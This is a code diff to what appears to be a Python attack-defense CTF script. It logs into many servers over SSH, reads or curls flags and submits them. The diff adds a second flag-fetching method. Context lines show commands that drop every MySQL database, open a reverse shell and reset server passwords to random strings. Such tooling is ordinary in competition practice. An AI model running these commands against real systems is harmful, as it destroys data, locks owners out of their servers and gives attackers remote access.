@@ -28,6 +28,7 @@ db_name = 'test'
 def submit_flag(flag):
     post_flag(flag)
     print "[+] Submiting flag : %s" % (flag)
+    post_flag(flag)
     return True
 
 timeout = 3
@@ -115,11 +116,13 @@ class SSHClient():
         with open(filename, "a+") as f:
             f.write("%s\n" % (self.infomation()))
 
-
-def get_flag(ssh_client):
+def get_flag_2(ssh_client):
     flag = ssh_client.exec_command("curl " + get_flag_url)[1].read().strip("\n\t ")
     return flag
 
+def get_flag(ssh_client):
+    flag = ssh_client.exec_command("cat " + flag_path)[1].read().strip("\n\t ")
+    return flag
 
 def extend_cmd_exec(ssh_client,cmd):
     is_read = True
@@ -134,7 +137,7 @@ def extend_cmd_exec(ssh_client,cmd):
 	cmd = ''
 	for db in db_name:
 	    cmd += 'mysql -u%s -p%s -e "drop database %s;";' % (db_user, db_passwd, db)
-    elif cmd == "get_flag":
+    elif cmd == "get_flag" or cmd == "get_flag_2":
 	# Because we have run get flag before, so we do notiong here
 	return
     elif cmd == "change_password":
@@ -160,7 +163,6 @@ def main():
     if len(sys.argv) != 3:
         print "Usage : \n\tpython %s [FILENAME] [cmd]" % (sys.argv[0])
         exit(1)
-    round_time = 60
     filename = sys.argv[1]
     cmd = sys.argv[2]
     print "[+] Loading file : %s" % (filename)
@@ -190,7 +192,7 @@ def main():
 	    open('autossh/now.txt','w').write('')
         for ssh_client in ssh_clients:
 	    # Get flag
-	    if cmd == "get_flag":
+	    if cmd == "get_flag" or cmd == "get_flag_2":
 		print "[+] Starting get flag..."
 		flag = get_flag(ssh_client)
 		print "[+] Flag : %s" % (flag)
@@ -201,9 +203,9 @@ def main():
 	    # Try to execute cmd 
 	    print "[+] Execute user cmd:%s" % cmd
 	    extend_cmd_exec(ssh_client,cmd)
-        for i in range(round_time):
-            print "[+] Waiting : %s seconds..." % (round_time - i)
-            time.sleep(i)
+        for i in range(script_runtime_span):
+            print "[+] Waiting : %s seconds..." % (script_runtime_span - i)
+            time.sleep(1)
 
 def command_info():
     print ""
@@ -212,7 +214,8 @@ def command_info():
     print "rm_db  ".ljust(20," ") + "drop database in the server"
     print "reverse_shell".ljust(20," ") + "reverse  shell"
     print "change_password".ljust(20," ") + "change the password of the server to the random string"
-    print "get_flag".ljust(20," ") + "get flag" 
+    print "get_flag".ljust(20," ") + "get flag by reading local file" 
+    print "get_flag_2".ljust(20," ") + "get flag by visiting remote flag url" 
     print ""
 
 if __name__ == "__main__":
